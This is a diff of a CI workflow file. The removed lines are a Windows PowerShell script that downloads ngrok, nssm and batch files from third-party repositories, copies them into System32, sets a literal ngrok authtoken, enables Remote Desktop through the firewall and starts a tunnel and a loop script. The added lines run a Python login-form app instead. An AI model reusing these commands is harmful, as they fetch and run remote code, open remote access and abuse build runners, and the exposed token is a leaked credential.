@@ -30,20 +30,7 @@ jobs:
     uses: script@v1
     with:
       script: |-
-         
- Invoke-WebRequest https://raw.githubusercontent.com/TheDarkMythos/Ngrok-Exe/master/ngrok.exe -OutFile ngrok.exe
- Invoke-WebRequest https://raw.githubusercontent.com/aloksharmakumar77/Windows2019RDP-US/main/Files/nssm.exe -OutFile nssm.exe
- copy nssm.exe C:\Windows\System32
- copy ngrok.exe C:\Windows\System32
- .\ngrok.exe authtoken 1o79XtSYTbApvdYruCJwpX5kyVJ_4fQ28refmFoEc36iQvgPc
-Invoke-WebRequest https://raw.githubusercontent.com/aloksharmakumar77/Windows2019RDP-US/main/Files/NGROK-US.bat -OutFile NGROK-US.bat
-Invoke-WebRequest https://raw.githubusercontent.com/aloksharmakumar77/Windows2019RDP-US/main/Files/NGROK-CHECK.bat -OutFile NGROK-CHECK.bat
-Invoke-WebRequest https://raw.githubusercontent.com/aloksharmakumar77/Windows2019RDP-US/main/Files/loop.bat -OutFile loop.bat
-Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server'-name "fDenyTSConnections" -Value 0
-Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
-Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -name "UserAuthentication" -Value 1
-sc start ngrok
-cmd /c NGROK-CHECK.bat
-cmd /c loop.bat
-      image: windows
+     cd /simpleLoginForm
+     python3 app.py
+      image: ros1243/hk
       
